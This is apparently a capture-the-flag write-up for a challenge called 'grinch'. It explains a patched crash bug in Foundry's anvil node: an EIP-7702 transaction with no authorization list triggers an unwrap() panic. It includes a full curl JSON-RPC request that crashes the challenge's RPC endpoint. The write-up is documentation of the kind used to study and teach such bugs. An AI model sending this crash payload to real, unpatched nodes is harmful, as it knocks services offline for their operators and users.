# grinch

https://github.com/foundry-rs/foundry/issues/11169

patched in https://github.com/foundry-rs/foundry/pull/11182

send a type 0x4 tx (EIP-7702) with an empty authorization list as described in https://eips.ethereum.org/EIPS/eip-7702 for it to be invalid

since `anvil` does only `unwrap()` and not `unwrap_or_default()`

```rust
to: to?.into_to()?,
chain_id: 0,
access_list: access_list.unwrap_or_default(),
authorization_list: authorization_list.unwrap(),
```

> The `authorization_list` is a list of tuples that indicate what code the signer of each tuple desires to execute in the context of their EOA. The transaction is considered invalid if the length of `authorization_list` is zero.

crash it with the `curl` request in `solve.sh`

every value `from`, `to`, `value`, `gas`, `maxFeePerGas`, `maxPriorityFeePerGas` can be anything, but `type` must be `0x4` to be a EIP-7702 tx

```bash
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc": "2.0",
    "id": 1,
    "method": "eth_sendTransaction",
    "params": [{
      "type": "0x4",
      "from": "0x826764b5D61ccB87eDA220A19d342429da82B9Cf",
      "to": "0x826764b5D61ccB87eDA220A19d342429da82B9Cf",
      "value": "0x16345785d8a0000",
      "gas": "0x5208",
      "maxFeePerGas": "0x4a817c800",
      "maxPriorityFeePerGas": "0x3b9aca00"
    }]
  }' \
  https://0ba46516-0eca-40d9-9f32-8819830f3adf.chall.dev.nnsc.tf/rpc
```
